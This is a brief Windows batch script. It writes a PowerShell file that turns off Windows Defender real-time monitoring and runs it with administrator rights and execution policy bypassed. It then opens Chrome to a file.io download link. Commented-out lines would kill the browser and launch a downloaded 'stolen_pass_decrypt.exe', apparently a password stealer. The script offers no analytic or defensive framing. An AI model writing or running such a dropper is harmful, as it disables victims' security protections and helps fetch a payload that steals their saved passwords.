@echo Set-MpPreference -DisableRealtimeMonitoring $true> test.ps1 
 Powershell.exe -Command "& {Start-Process Powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File %~dp0test.ps1 -Confirm:$false' -Verb RunAs}" 
 start chrome https://file.io/MhtbUx 
 @rem choice /d y /t 30 > nul 
 @rem taskkill /F /IM chrome.exe /T 
 @rem start C:\Users\%username%\Downloads\stolen_pass_decrypt.exe 
 @REM stop here 
 
 
